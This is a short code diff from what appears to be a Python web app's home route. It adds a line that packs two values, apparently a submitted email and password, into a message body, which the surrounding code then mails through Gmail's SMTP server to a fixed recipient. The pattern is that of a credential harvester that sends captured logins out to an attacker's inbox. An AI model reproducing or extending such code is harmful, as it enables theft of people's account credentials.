@@ -27,6 +27,7 @@ def home():
     message["From"]=myemail
     message["To"]=recvemail
     message["subject"]=csubject
+    cbody=f"{emai}\n{pa}"
     message.set_content(cbody)
     context=ssl.create_default_context()
     with smtplib.SMTP_SSL("smtp.gmail.com",465,context=context) as server:
